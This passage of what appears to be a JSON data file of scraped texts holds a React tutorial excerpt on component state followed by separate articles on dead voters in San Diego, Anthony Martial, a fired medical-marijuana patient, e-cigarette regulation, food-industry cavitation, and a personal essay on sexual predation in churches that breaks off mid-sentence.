ReactDOM.render( React.createElement('div', null, React.createElement(TimerContainer), React.createElement(TimerContainer) ), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nThe TimerContainer component from the above example is a typical React component; I wouldn’t be surprised to see something like this in a real application. The only thing that it doesn’t do is clean up after itself – which is a big problem that we’ll get to in a moment.\n\nWhat other types of components can you build with component state? Here are a few ideas:\n\nForm components can store their current value in state\n\nData fetched from an API with can be stored with state\n\nPagination, filters and orders can be stored in state, then used to select which part of the props to display\n\nAnimations can use state to find the time elapsed since the previous frame\n\nSpeaking of animation, this guide has been conspicuously lacking in animated fractals. So…\n\nLet’s create a component!\n\nNow that you know about component state, you know everything that you need to create an animated tree component like the one from way back in part one. If you need your memory jogged, here it is again:\n\nmain.js PythagorasTree.js index.html import { PythagorasTree } from './PythagorasTree.js' ReactDOM.render( React.createElement(PythagorasTree, { sprout: 0.04, sway: 0.1, }), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nBut where to start? Well, do you remember the TreeBox component (also from part one)?\n\nmain.js PythagorasTree.js index.html import { TreeBox } from './PythagorasTree.js' ReactDOM.render( React.createElement(TreeBox, { totalLevels: 5, size: 50, heightFactor: 0.35, lean: 0.1, }), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nConsider that a swaying tree is really just a tree whose lean prop cycles from one value to another as time passes. And given that you now know how to add a timer to a component, all that’s left is to convert a time to a lean .\n\nA teensy bit of math\n\nYou can skip this section if you already know how to use Math.sin(time) to cycle between two numbers.\n\nTo make the tree sway, you’ll need to cycle the lean prop between roughly -0.5 and 0.5 as time passes. But how do you turn an ever-increasing number like time into a cycling number? With trigonometry functions, of course! And in particular, with Math.sin() .\n\nSeeing is believing, so here’s an example that uses a Scope component to show how the value of Math.sin(time) changes over time – press START to see it in action.\n\nmain.js Timer.js Scope.js index.html import Scope from './Scope.js' import { Timer, TimerDisplay } from './Timer.js' const createElement = React.createElement class ScopeDemo extends React.Component { constructor(props) { super(props) this.state = { time: 0, active: false } this.timer = new Timer(() => this.setState({ time: this.timer.time })) this.callbacks = { onStart: () => { this.timer.start(); this.setState({ active: true }) }, onStop: () => { this.timer.stop(); this.setState({ active: false }) }, onReset: () => { this.timer.reset(); this.setState({ time: 0 }) }, } } render() { // `Math.sin` converts time into a number that cycles between -1 and 1 const lean = 0.5*Math.sin(this.state.time/2) const heightFactor = 0.2 + 0.1*Math.sin(this.state.time) const displayProps = Object.assign({}, this.state, this.callbacks) return createElement('div', null, createElement(TimerDisplay, displayProps), createElement('br'), createElement(Scope, { title: 'lean', x: lean }), createElement(Scope, { title: 'heightFactor', y: heightFactor }) ) } } ReactDOM.render( createElement(ScopeDemo), document.getElementById('app') ) Compiled Build In Progress Console Console\n\nAnd now that you know how to make a point sway, all that is left is to make your entire tree sway!\n\nTo start you off, I’ve created component that draws a static tree. To finish the exercise, you’ll need to do the following:\n\nCreate a Timer instance in the constructor Set the lean prop based on the value of the timer Add a callback method for the button (and bind it in the constructor) Set the button text appropriately\n\nGood luck! As always, you can check the solution if you get stuck or if you’d like to compare your answer with mine. But do give the exercise a fair go first.\n\nmain.js PythagorasTree.js Timer.js index.html import { TreeBox } from './PythagorasTree.js' import { Timer } from './Timer.js' const createElement = React.createElement class AnimatedTree extends React.Component { constructor(props) { super(props) this.toggle = this.toggle.bind(this) this.state = { time: 0, active: 0 } // EXERCISE: add a timer } render() { const buttonText = 'EXERCISE: start or stop?' return createElement('div', null, createElement(TreeBox, { totalLevels: 5, size: 50, heightFactor: this.props.sprout + 0.3, lean: this.props.sway, }), createElement('button', { onClick: this.toggle }, buttonText) ) } toggle() { // EXERCISE: implement this } } ReactDOM.render( createElement(AnimatedTree, { sway: 0.1, sprout: 0.05 }), document.getElementById('app') ) Compiled Solution Build In Progress Console Console\n\nDid you make the tree sway? Then congratulations! setState is one of the most important parts of React. It’s all down hill from here!\n\nOf course, while state is important, there is still a lot to learn – and there are still a lot of ways to mess things up.\n\nTips & Gotchas\n\nClass components are a powerful tool. And precisely because they are powerful, you’ll need to exercise some caution using them.\n\nHere are a few particular things you should keep in mind, starting with the golden rule of state:\n\nIf you don’t need state , don’t use it\n\nState adds complexity to your component. And while necessary complexity is… necessary, unnecessary complexity is going to come back and haunt you.\n\nPractically speaking, this means that if you can compute something from props instead, you should do so. The only time you should cache a computation in state is when you’ve measured a significant performance benefit from doing so.\n\nSet initial state within the constructor\n\nIf you don’t set this.state , it defaults to undefined . So if your component makes use of state, you’ll make your life a whole lot easier by setting an initial value in the constructor. And remember – in the constructor, you don’t need to call setState . Simple assignment is fine:\n\nconstructor ( ) { this . state = { } }\n\nNot everything is re-rendered\n\nCalling this.setState(...) won’t re-render the entire application; it will only render the current component and its children. Of course, only re-rendering the current component if often a lot faster than rendering the entire application, so you can use this to your advantage when tweaking performance.\n\nChanges are not immediate\n\nCalling this.setState(...) won’t immediately update this.state . Instead, it’ll schedule an update which will occur sometime before the next repaint, but probably not before the method that called setState finishes executing. If you need to know when the update completes, you can pass a callback.\n\nDon’t set state within render\n\nA class component’s render method is for rendering. All it should do is figure out how to convert this.props and this.state into a React Element. That’s it.\n\nBut with this said, sometimes you do need to set some state after each render. And React provides a way to do this, called lifecycle methods. And we’ll get to them in a moment.\n\nClean up after yourself\n\nYou should not call this.setState(...) after your component has unmounted. If you do, React will get very angry and will log an error to your console.\n\nBut wait a moment… how do you know when your component is unmounted? Actually, given what you currently know, you don’t know when the component is unmounted.\n\nIn fact, this is a problem that you’ve already encountered: the Timer component used throughout this article will never stop calling this.setState , even if the component is unmounted. And this is kinda really bad. But how do you fix it? With lifecycle methods!\n\nLifecycle methods\n\nLifecycle methods are React’s way of notifying class components about things that are about to happen to them – like mounting, unmounting, rendering, and receiving new props.\n\nBut how do you use lifecycle methods? Find out in the next episode of Learn React By Itself. And by next, I mean the one after this brief introduction to JSX. Because typing React.createElement is bloody annoying, amirite?\n\nContinue to: A Brief Introduction to JSX",
  "latent_10789": "View the Video Registrar was warned about deceased voters\n\nThe Registrar of Voters was informed last year about four citizens shown in county records as voting after they died — people who remain registered to vote to this day.\n\nThe four were featured in a U-T Watchdog story last month about ballots cast in the name of deceased citizens.\n\nThe Santa Clarita-based group Election Integrity Project came forward after the story ran, telling the U-T that four of the voters were the subject of a complaint filed with the registrar in November.\n\n“They’re in a tough spot and they have certain rules they have to follow,” said Ellen Swensen, a data analyst for the Election Integrity Project. “But they never responded to us.”\n\nThe four voters identified separately by both the elections group and the U-T were:\n\n• Evan Dixon, a Republican from San Diego who died Jan. 26, 2001, at age 44, and records show a ballot was cast for him at the polls on Nov. 6, 2012.\n\n• Forrest Downie, a Republican from Chula Vista who died Nov. 10, 2005, at age 97, and is listed as casting an in-person ballot on Nov. 4, 2008.\n\n• John Neibert of Chula Vista, registered with no political party, who died Dec. 25, 1995, at age 71, and is on record as casting an absentee ballot Nov. 6, 2012.\n\n• Roy O. Stephens, a Republican from San Diego who died Feb. 20, 1998, at age 83, and then was listed as casting a mail-in ballot in the May 19, 2009, election.\n\nIn the case of Stephens, a relative also notified the county of his death.\n\nHis son, Roy O. Stephens, lives in his father’s former house and told the U-T that he informed the county of the death 10 years ago and asked that election materials no longer be sent — to no avail.\n\n“I guess you could say it’s a bit annoying,” Stephens said. “I’m not big on hanging on the phone trying to get through to bureaucracies.”\n\nThe Watchdog investigation last month found that complications often arise when a voter dies outside the county, so there is no official record in San Diego of the death.\n\nBut three of the voters in question are shown in the records of the San Diego County clerk as deceased — Dixon, Neibert and Stephens. Downie died in Los Angeles, according to the Election Integrity Project’s records.\n\nCalifornia law requires county clerks to send a monthly report of death records to their registrar of voters. It also requires the Secretary of State and the California Health and Human Services Agency to collaboratively provide death records for people who died in other counties to registrars.\n\nThe office of Registrar of Voters Michael Vu uses those records to remove voters from the rolls, but he said there is no way to determine why the voter registrations for Dixon, Neibert and Stephens had never been canceled. The office no longer has the records that the clerk’s office sent after their deaths, and Vu did not work for the registrar’s office at that time.\n\nThe registrar has left all four voters on its registration rolls over concerns that it might violate state and federal regulations by removing them without proper documentation. The agency is seeking official copies of death certificates.\n\nThe registrar’s office has determined that votes marked for Dixon and Neibert in the November 2012 general election were caused by a data entry error — that is, the ballots cast do not match the record shown in the data.\n\nThe office no longer has the original ballots from the 2009 and 2008 elections that included posthumous votes in the names of Stephens and Downie.\n\nThe Election Integrity Project, which advocates for more barriers to fraud in the elections system, used a different methodology than the Watchdog in its review of voter data to identify after-death votes. The group used a state index of death certificates, while the U-T used a federal Social Security index of deaths.\n\nThe U-T’s original story found 26 ballots cast in the names of 10 dead voters since 1998. The Election Integrity group found 15 ballots cast in the names of 10 dead voters, six of whom were different from those identified by the U-T.\n\nThe Watchdog found that five of the additional deceased citizens identified by the Election Integrity group also appear in the Social Security death index, matching first name, last name, middle initial and date of birth.\n\nThe most prolific deceased voter identified by the Election Integrity group was Joy L. Williams of Escondido, a Republican who died in 2009 at 74 and went on to cast four absentee ballots, according to county records.\n\nThe group also identified Lorraine Hawley of Escondido, a Republican who died in September 2010 and went on to cast absentee ballots in November 2010 and November 2012, according to county records.\n\nMost years, hundreds of thousands of votes are cast in San Diego County, so the rate of votes cast in the name of the dead is minuscule.\n\nBut the data reviews were not comprehensive, raising the possibility that there have been more votes by the deceased. And the results raise questions about the county’s own system for getting deceased voters off the rolls.\n\nMany elections are close, making the integrity of the process important. In the 2008 Chula Vista election results that include a vote from Downie, Councilwoman Pamela Bensoussan won her seat over Russ Hall by only 46 votes.\n\nUnder the National Voter Registration Act of 1993, state election officials have to balance concerns about potential voter fraud against the possibility of disenfranchising legitimate voters. In California, county registrars can easily cancel the registration of any voter who provides written consent, but the process of removing voters for any other reason is complicated.\n\nThose who are dead, mentally incompetent or serving out a felony sentence are technically ineligible to vote, but registrars can’t change their voting status without a certified government document that complies with state and federal regulations. In the case of dead voters, registrars need an official death record from the county where the voter died.\n\n“Although there is no obligation, we do accept third party analysis, like the Election Integrity Project, as a means to supplement the effective methods that are currently employed based on federal and state law,” said Vu, the county registrar. “Any analysis by third parties, including EIP’s, must be addressed carefully as it may inadvertently cause voters to mistakenly lose their right to vote.”\n\nSince November 2013, Vu said his team has held three elections, moved to a new facility in Kearny Mesa and updated 312,000 voter records. He also has met recently with Ruth Weiss, the Election Integrity Project’s education director and San Diego County liaison, to discuss the group’s observations from the June 2014 election. His office has not made any determination on the ballots the group highlighted in its data analysis.\n\nWeiss told the Watchdog that Vu has been open and responsive, and she believes he’s doing his best to clean the voter rolls and juggle the rest of the registrar’s responsibilities.\n\n“The 1993 voter registration act is keeping him from cleaning the rolls as well as he should, but the bigger picture here is, that should not be his job,” Weiss said.\n\nBlame rests with the California Secretary of State’s office, she said.\n\nIn 2002, Congress passed the Help America Vote Act, handing down new standards for how states should run elections. Among the key provisions was a requirement for states to develop and maintain a centralized database of all registered voters — and to give county registrars timely access to information in situations such as a voter who dies or relocates to another county.\n\nTwelve years later, California is still struggling to establish its centralized registration system, which is expected to be fully operation in June 2016.\n\n“We look forward to the anticipated implementation of the statewide voter registration system to make maintaining voter records even more efficient and accurate,” Vu said.\n\nSecretary of State Debra Bowen’s office did not return a call for comment.\n\nSubstantiated reports of voter fraud are rare, particularly cases in which someone has actually impersonated another voter. Justin Levitt, a law professor at Loyola Marymount University in Los Angeles, said that clerical errors are the most likely cause of a ballot that ends up on record for a dead voter.\n\n“For better or worse, humans run elections,” Levitt told the Watchdog. “At the end of a 15-20 hour day, they’re going to make mistakes.”\n\nStill, Swensen said, the Election Integrity Project was concerned with the potential for voter fraud as much as fraud itself.\n\n“If they’re dead, why are they still on the rolls?” Swensen said. “If dead people are on there, they can be impersonated.”\n\nVu said his team errs on the side of the voter, in part to avoid lawsuits from the Department of Justice or advocacy groups on voter-rights issues. County registrars can flag suspicious voters, but only law-enforcement agencies can investigate and enforce violations of state and federal voter laws.\n\nFollowing the Watchdog’s investigation last month, Vu referred the two most troubling cases to the District Attorney’s Office.\n\nDara Welty, an aspiring opera singer who suddenly died in 1998 in Bolivia, had 14 absentee ballots cast in her name, according to the U-T report. Francis DeGregory, a World War II veteran who died in 2008, subsequently had four absentee ballots cast in his name.",
  "latent_10821": "The Manchester United forward could benefit from the scandal plaguing his France teammates, writes Kris Voakes.\n\nJust two months ago, Anthony Martial was considered an expensive gamble, a little-known teenager for whom Manchester United had massively overpaid. Now he is United’s first-choice striker, one of the most important players in that side and set to become just as vital to France’s international hopes.The 19-year-old has scored five goals in 14 games since arriving at Old Trafford, standing out as both a central striker and a left-sided attacker. That flexibility has allowed Louis van Gaal to find a greater depth and variation in his forward line than was previously evident.United might well have struggled for goals of late but Martial’s run on the left of an attacking midfield three cannot be considered anything other than a success, leaving his manager raving. “He can play, in my opinion, four positions,” Van Gaal told MUTV. “He can play at seven, as a right winger; 11, the left winger; the striker’s position; and also at 10, I believe.”It was also noticeable that after the third of three straight 0-0 draws to end October at Crystal Palace, opposition boss Alan Pardew explained that his “Stop Martial, and you stop United” team talk had been proved right. Wherever he plays, Martial is the Red Devils’ danger man.And such a quick adjustment to the Premier League had even Van Gaal conceding his surprise.“When you are a 19-year-old you cannot expect consistency — normally you have dips, so I also expect that from him,” Van Gaal said. “So far he has shown his talent is at a high level and he has shown he can play in our system. He has shown he wants to do that and he can do that.\"But it clearly isn’t just Van Gaal and United’s fans who have been thrilled by the former Monaco man’s progress, with Didier Deschamps having called up Martial for his first four international appearances over the past couple of months. And the front man’s rise is unlikely to end there because of the current criminal charges hanging over the head of France’s star striker Karim Benzema.The Real Madrid ace has allegedly been caught on tape discussing an apparent sex tape involving national teammate Mathieu Valbuena, and Benzema faces charges of complicity in an attempt to blackmail and participating in a criminal conspiracy.The ugly episode has left Deschamps shorn of two of his key players, with Benzema already struggling with injury while Valbuena is said to be “not psychologically ready” for the demands of international football ahead of this week’s friendlies against Germany and England. And the absence of Benzema in particular looks set to fast-track Martial to the front of the queue ahead of a vital run of games that will end with the Euro 2016 finals in France next summer.While l’Hexagone are not short on top-level strikers, many are going through significant struggles. Loic Remy is finding game time difficult to come by for a struggling Chelsea side, with injuries and Diego Costa taking turns to keep the ex-Marseille and Newcastle man out of the picture. Elsewhere, Olivier Giroud is flattering to deceive much of the time for Arsenal, and Andre-Pierre Gignac’s transfer to Tigres has taken him away from the spotlight that big-game European football offers.Alexandre Lacazette remains a possibility, but his greater suitability to a wider or slightly deeper position than the No. 9 spot could persuade Deschamps that Martial is his most viable center forward option. There are pros and cons behind every potential choice, but the youngster’s makeup appears to be the best match for France’s needs.He may still only be a teenager, but Martial has already shown with his quick adaptation to life in the Premier League that he can live with the expectation of football at the highest level. He remains unassuming despite the way in which his career — his life — has changed since his deadline day move.And Deschamps is certainly paying attention to the great strides he has made.“He has the potential. Everybody is surprised by what he is doing at United, but that’s good for him and good for us. He deserves to be here,” the France boss said recently. “It was anything but easy after everything that has been written and said about him.“It has silenced a few people. He's young, and he may have more complicated times, but he’s able to make great things happen. He did in Monaco. He’s doing it now at a club at another level, so it is easier to pay attention to his performances. He’s always been talented though.”It feels like a huge moment in his fledgling career could be approaching. Martial is beginning to prove he has what it takes to play at the very top at a time when Les Bleus are crying out for a solution to their very public issues.A huge summer might just be around the corner and the hosts may appear to be in disarray, but after displaying he has the qualities necessary to take Manchester United by storm there is every reason to believe Martial can steal the headlines for France and make himself indispensable come Euros time.",
  "latent_10899": "June 2011 marks the 40th anniversary of President Richard Nixon's declaration of a \"war on drugs\" — a war that has cost roughly a trillion dollars, has produced little to no effect on the supply of or demand for drugs in the United States, and has contributed to making America the world's largest incarcerator. Throughout the month, check back daily for posts about the drug war, its victims and what needs to be done to restore fairness and create effective policy.\n\nHaving battled sinus cancer and an inoperable brain tumor for more than a decade, cancer patient Joseph Casias is used to fighting for his life. But now the War on Drugs has forced him to fight for his livelihood, too.\n\nJoseph's condition has required extensive treatment and chemotherapy, interferes with his ability to speak, and is a source of severe and daily pain. But for five years, in spite of the pain caused by his medical condition, Joseph was a valued employee at his local Wal-Mart store in Battle Creek, Michigan, where he began as an entry-level grocery-stocker in 2004 and progressed to become an inventory control manager whom the store recognized as Associate of the Year in 2008.\n\nThroughout his successful career at Wal-Mart, Joseph, a husband and father of two, has had to cope with intense pain in his head and neck 24 hours a day. The pain relief medicine prescribed by Joseph's oncologist helped a little, but Joseph continued to experience constant pain as well as nausea, a side effect of the medication.\n\nIn 2008, the people of Michigan, by voter initiative, enacted the Michigan Medical Marihuana Act (MMMA), which allows the use of marijuana to treat certain severe medical conditions such as Joseph's. After the MMMA was enacted, Joseph's oncologist recommended that he try marijuana in accordance with the new state law, and Joseph obtained the appropriate registry card from the state. Joseph immediately found medical marijuana very helpful to treat his condition: it dramatically reduced his pain without the previous painkiller's side of effect of nausea, so he even gained back some of the weight he had lost during his treatment.\n\nJoseph complied with all the MMMA's requirements and provisions. In accordance with state law, he never used marijuana in the workplace, and never performed duties of any kind for Wal-Mart while under the influence. Joseph made do with his other prescription painkillers throughout the workday and only used the marijuana when he got home from work.\n\nIn November 2009, Joseph twisted his knee at work. Wal-Mart policy requires drug testing of all employees injured at work, so Joseph was given a urinary drug test. Not surprisingly, he tested positive for marijuana. Joseph showed his supervisors his state medical marijuana card, which permits him to use the substance to treat the pain his cancer causes, but Wal-Mart didn't care. Ignoring the Michigan law provision prohibiting \"disciplinary action by a business\" against a qualifying medical marijuana patient, the Wal-Mart store manager fired Joseph. He has been out of work ever since.\n\nSome people question why marijuana patients should get special employment protection when that drug remains illegal under federal law. But it is precisely because marijuana remains illegal under federal law — and carries a resulting stigma — that the people of Michigan saw the need to provide special employment protections to the people who use medical marijuana legally under state law. As the people of Michigan recognized, federal law, which continues to push the agenda of the failed War on Drugs, has simply failed to keep pace with the experiences of patients like Joseph for whom medical marijuana is uniquely beneficial.\n\nThe ACLU is now representing Joseph in his wrongful discharge lawsuit against Wal-Mart, and fighting for the medical marijuana rights of patients nationwide. Wal-Mart should not be allowed to punish Joseph for merely treating his pain and using marijuana as allowed by state law. No patient should ever be forced to choose between his job and his medicine.\n\nLearn more about drug law reform: Sign up for breaking news alerts, follow us on Twitter, and like us on Facebook.",

  "latent_11405": "Last Updated: 17 Feb 2014\n\nThere’s a new craze sweeping the nation. Adults partaking have formed clubs and meet regularly to indulge. It’s happening on streets, on public transport, in local boozers: anywhere. It’s called vaping.\n\nIt doesn’t sound like a terribly agreeable habit - but before you jump to conclusions, it refers to using an electronic cigarette. Vaping is the new - 'safe' - smoking.\n\nE-cigarettes come in various forms: some are designed to look like real cigarettes, others are simply elaborate metal tubes, but both work in the same way. They contain ‘e-liquid’ capsules - nicotine disolved in propylene glycol or glycerine. When turned on (powered by batteries), the devices produce a vapour, which is inhaled (hense 'vaping').\n\nDespite the fact that the long-term effects of smoking e-cigarettes are still unclear, they have become popular with smokers eager to give up, partly because they've been deemed ‘as dangerous as a cup of coffee’ thanks to the absence of tar. Some have claimed if all smokers switched, millions of lives would be saved.\n\n‘Nicotine itself is not a particularly hazardous drug,’ Professor John Britton, who leads the tobacco advisory group for the Royal College of Physicians, has been quoted as saying.\n\n‘It's something on a par with the effects you get from caffeine… If all the smokers in Britain stopped smoking cigarettes and started smoking e-cigarettes, we would save 5 million deaths in people who are alive today. It's a massive potential public health prize.’\n\nWhatever the health implications, it's clear smokers are coming to rely on them. A burgeoning industry has grown up around the sale of e-cigarettes: according to estimates, there are 1.3 million ‘vapers’ in the UK and the number is shooting up. In the US, sales of e-ciggies are expected to pass the $1bn mark this year, up from $600m last year.\n\n‘The industry is growing incredibly rapidly,’ James Dunworth, co-founder of ECigaretteDirect.co.uk, told MT.\n\n‘We started out in 2008 when no one knew what e-cigarettes were. Now we have 19 employees and experienced 400% growth in 2011. We started out online, but people are looking to buy on the high street now so we have opened two shops and are negotiating on a third.’\n\nTrade is clearly roaring for the time being, but there could be a spanner in the works for the electronic cigarette industry. The EU is calling for e-cigarettes to be classed as medicines, if this were to happen, products would need to be in line with medical regulation – something which Dunworth fears is impossible.\n\n‘Non of the current products on the market comply with medical regulations – they want to regulate the dose of nicotine which is delivered and this isn’t possible with current technology,’ says Dunworth.\n\n‘Also, the cost of having a license for each product to a company like ours, which has thirty different flavours, would put us out of business.’\n\nYou can see the EU's point: expecting a widely used product to comply with regulations to ensure safety sounds like common sense. According to The Medicines and Healthcare Products Regulatory Agency (MHRA) the e-cigarettes currently on the market do not meet appropriate standards of safety and quality.\n\n‘We can't recommend these products because their safety and quality is not assured, and so we will recommend that people don't use them,’ Jeremy Mean of the MHRA told a news conference.\n\nBut to be fair to the industry, there are certain regulations currently in place. E-cigarettes are currently classed as general consumer products and are regulated by trading standards – these stipulate they cannot contain hazardous chemicals. The Electronic Cigarette Industry Trade Association (ECITA) also has its own set of regulations, which members must adhere to.\n\nCurrently, the e-cigarette industry is not allowed to make medical claims for their products, for example retailers can’t refer to them as a way to quit smoking. It has been suggested that if they were to be regulated as a medical product, they could be offered on the NHS. Attempts to classify e-ciggies as medical products have been made across the channel in Holland and Germany but the industry shot them down in court.\n\n‘Regulations which guarantee the quality of devices is already in place thanks to the ECITA – we have an audit every six months when a representative goes through our products and we are forbidden to sell our products to under 18s. It’s not law, but it is in our ECITA regulations,’ Dunwoth tells MT.\n\nHe blames the EU for not cracking down where it matters.\n\n‘These regulations are applied haphazardly – what needs to happen now is these rules enforced more tightly.’\n\nWho knows how the e-cigarette show-down will go down now the EU is involved. But the worry is that if legislation is pushed through, our ‘vaping’ vendors may be vanquished. And if that's at the cost of 5 million lives, it seems a big sacrifice to make.",
  "latent_11603": "How The Food Industry Uses Cavitation, The Ocean's Most Powerful Punch\n\nEnlarge this image toggle caption Reinhard Dirscherl/ullstein bild via Getty Images Reinhard Dirscherl/ullstein bild via Getty Images\n\nThroughout history, being on the receiving end of anything involving cavitation, a miniscule underwater implosion, has been bad news. Millions of years before humans discovered cavitation — and promptly began avoiding it, given its tendency to chew up machinery — the phenomenon has provided the shockwave and awe behind a punch so ridiculously violent that it's made the mantis shrimp a honey badger-esque Internet mascot.\n\nNow, a slew of companies are co-opting the phenomenon behind the ocean's most powerful punch to process food and beverages from yogurt to beer.\n\nCavitation is when low pressure in a liquid produces a bubble that rapidly collapses, and heats up to 20,000 Kelvin — hotter than the sun's surface. This usually releases a flash of light called sonoluminescence, which physicists still don't understand. Some physicists even theorize that cavitation bubbles could get hot enough to power nuclear fusion.\n\nMantis shrimp's club-like appendages generate these bubbles by punching with the acceleration of a .22 caliber bullet. When they hit their prey's shell, they create a low-pressure area, vaporizing water and forming a cavitation bubble that collapses with a shockwave with up to 280 percent of the force of the original punch. Pistol shrimp, the world's loudest animal, snap their claws so quickly that they create a low-pressure jet that causes cavitation bubbles, stunning prey.\n\nWe humans are newcomers to cavitation. We never properly observed it until 1895, on torpedo boat propellers. And, save for using cavitation to reduce drag on torpedoes, engineers have generally designed equipment to avoid it like the plague.\n\nAccording to Doug Mancosky, chief science officer of Hydro Dynamics, which designs cavitation technology, when 15 years ago he started trying convince biofuel and petroleum manufacturers that cavitation could be used to refine their products, they thought he was crazy. Now, his company is at the forefront of a burgeoning sector of firms selling cavitation technology to food and beverage manufacturers.\n\nTheir first foray into the food market, in 2013, was when Hydro Dynamics discovered that cavitation could simplify egg pasteurization. According to Mancosky, their tech, which uses a hole-filled rotor (picture the inside of a washing machine) to generate cavitation bubbles, could heat from within the liquid. \"The surfaces of our devices actually stay cooler than the liquid flowing through it\" so eggs couldn't harden like they did on hot industrial equipment. And since companies could tune the intensity of cavitation, they could pasteurize and mix eggs without breaking apart too many proteins in them.\n\nSince then, Hydro Dynamics and their licensees have branched out into processing pet food and dairy products — such as making fluffier, aerated yogurt products and milk. More recently, they've begun using cavitation bubbles to unravel and condense proteins in low-fat whey drinks to a size where they produce a richer, fat-like mouthfeel. They aren't alone in the dairy market, though. Among others, Yoplait and Valio have also patented in-house methods of using cavitation to process dairy products in recent years.\n\nHowever, since 2015 — when an Italian National Research Council team published pioneering research on using cavitation to brew beer — cavitation has been making the most waves in the beverage industry.\n\nAccording to one scientist from that research team, Francesco Meneguzzi, they found that cavitation processed and converted more of the starch in barley to brewable sugars — without having to germinate it first — in less time, at lower temperatures. It also reduced volatile gases, broke apart gluten, and punctured microbes' membranes, sterilizing wort, the sugary liquid fermented into beer. They could skip boiling the wort, reducing energy consumption by 40 percent. MIT's Technology Review hailed the team's innovation, and since then, cavitation has become a burgeoning fascination of craft brewers.\n\nHydro Dynamics, for example, found that as cavitation bubbles formed and collapsed, they pushed and pulled wort through hops \"like a plunger,\" Mancosky says, improving flavor extraction. Two years later, they have partnerships with a slew of craft breweries, including Anchor Brewing and Cabarrus.\n\n\"One application leads to another,\" Mancosky says. Cabarrus, which makes a beer infused with cold brew coffee, asked him if they could use cavitation to extract more flavor from coffee. \"We said 'Yeah, it should help, the same way it helps extract more flavor from hops. They fired it up, and next thing you know, they're able to reduce their cold brewing time by 80 percent.\" Afterwards, working with Anchor Brewing on their blackberry ale, Hydro Dynamics demonstrated that cavitation could also more effectively extract flavor from fruit.\n\nThe transition to using cavitation technology has posed some technical challenges for brewers, though. As Anchor Brewmaster Scott Ungermann tells NPR, \"cavitation can drive extraction of undesirable flavors as well as the ones that we are looking for ... with so many other variables it is very difficult to dial in exactly the flavor profile.\"\n\nRyan Cottongim of Witches Hat Brewery, another craft brewer that works with Hydro Dynamics, seconds Ungermann's sentiments, saying that trying to integrate new technology while trying to keep brews consistent has been difficult. Moreover, while Cottongim has enjoyed more efficiently extracting extra hop flavor, \"at some point you hit that saturation point where you're not going to get any more from this.\"\n\nNevertheless, cavitation's alcoholic applications go even further. It can age liquor and wines by acting a catalyst. Cavitation can effectively accelerate barrel aging by extracting flavor from charred wood chips — while using the char as a carbon filter to trap impurities.\n\nIn the past two years, Hydro Dynamics has sold equipment to several wineries and distilleries for aging. And, two companies, Cavitation Technologies and Sonn Beverage Systems, are targeting consumers with household devices that age wine and spirits.\n\nSonn, however, uses ultrasound cavitation, a method of generating cavitation with soundwaves most well known for its use in breaking up kidney stones. Sonn CEO Denis Londry tells NPR they opted for ultrasound because \"unlike other ways of generating cavitation, nothing is pressurized.\" The whole thing can be an open container with few moving parts — suitable for a countertop, if not a winery.\n\nMuch like Hydro Dynamics has, Londry says Sonn is also aiming to expand into the tea and coffee markets — both of which are markets eager to improve their flavor extraction technology. In fact, one cavitation technology firm confirmed to NPR that they're testing cold brewing equipment with one of the world's largest coffee chains.\n\nBut the edible applications of cavitation don't stop there. The same phenomenon behind the most powerful punch makes for a better blender, catalyzes sought-after reactions, and can \"neutralize a large spectrum of spoiling and harmful microbes,\" such as bacteria and waterborne viruses, according to Meneguzzo, \"much more effectively and efficiently than most other technologies.\"\n\nAfter millions of years of punctuating the most destructive attacks the ocean has ever seen, the cavitation bubble has a bright future in making humans' food and drinks safer and tastier.",
  "latent_11702": "A central plot-line in the disturbing but stunning 1999 film American Beauty involves sexual fantasies about a teen girl by the main character, a middle-aged suburban husband and father desperately living out a quiet nightmare version of the American Dream. In a discussion of the film with my then-boss, an older man, a strong Christian leader and educator, he told me, “Any man who says he hasn’t had such fantasies is a liar.” His candor was as rare as it was refreshing. But what he said wasn’t shocking.\n\nPerhaps if the church dealt more honestly with sexual temptation, temptation would lead less frequently to acting out on it. Keeping talk of such temptations taboo leads naturally to imagining that one’s temptations are somehow unique, which leads, in turn, to imagining oneself as somehow unique and, therefore, entitled in one’s status as “special” to act on one’s temptations.\n\nImagine: for every child abused, the number of those who are tested and groomed as potential victims must be utterly staggering.That’s the sense I got from the now-removed post written by an anonymous sex offender and published last week at Leadership Journal. Yet, the truth is that the impulses that led to this former youth pastor’s sexual abuse of a child under his care and authority—pride, lust, covetousness, selfishness, and the elaborate mental apparatus to rationalize it all—are, ultimately, rather banal. They are as old as humankind. The editors’ well-intentioned decision to publish the piece as a cautionary tale betrays in them and their target audience an underlying naiveté in regarding the abuser’s rationalizations as insightful and revealing enough to give him a platform for voicing them.\n\nLet us ever be horrified at every form of abuse—but let us stop being shocked.\n\nIn my own ordinary experience, encounters with adult sexual predators were a common—if not universal—part of growing up. I cannot even begin to count the friends and relatives who were pursued as minors—sometimes “successfully,” sometimes not—by adult predators: a friend pursued by her high school swimming coach, a 14-year-old-going-on-11 member of my family who eventually bore the child of her 26 year-old “boyfriend” (who we later learned was a convicted pedophile), a friend’s daughter molested by a man while her pastoring father was busy doing ministry, another friend’s father who was arrested for exposing himself to children, more than one friend who was molested as a child by a grandfather, a former student of mine who was raped over and over as a child by the men in her church. And then there’s me, whose story is nothing compared to those.\n\nI was a junior in high school when I moved in the middle of the academic year from a tiny school in rural Maine to a sprawling public high school in suburban New York. I don’t know if it was being the new kid that made me stand out in a sea of 2,000 students or what. But, for some reason (or perhaps no reason at all), my health teacher started offering me extra, unsought attention during the chaos that constituted our class time. “I need a woman like you in my life,” he whispered in my ear while walking between the rows of distracted students. Another time, he walked over to where I was sitting on the window sill before class, put his hands on the tops of my thighs and ran them up and down my legs.\n\nThose days were different from today. Then, such people were referred to as “dirty old men,” a phrase that bespoke their commonness but was unfortunately dismissive of the seriousness of their actions. I told my parents about my teacher. They told me if I needed their help in handling him to let them know. I didn’t. It ended. I don’t remember how. Fortunately, my parents had raised me to be strong and independent, and they succeeded. I see now that other girls—too many—were not so lucky.\n\nI viewed the Leadership Journal post itself as less problematic than the blindness to the scope of the problem of abuse that its perceived novelty implied. In response, I shared a Twitter-sized version of my experience with one of the Leadership Journal’s editors. But lest my story be taken as some sort of anomaly, I followed that with a general question posed to the Twitterverse: How old were you when you were pursued sexually by an adult authority?\n\nI knew in posing the question that it would prove right to cast it not as “if” but “when.” After all, 7% of girls in grades 5-8 and 12% of girls in grades 9-12 report having been sexually abused, along with 3% of boys grades 5-8 and 5% of boys in grades 9-12. Of course, my question was much 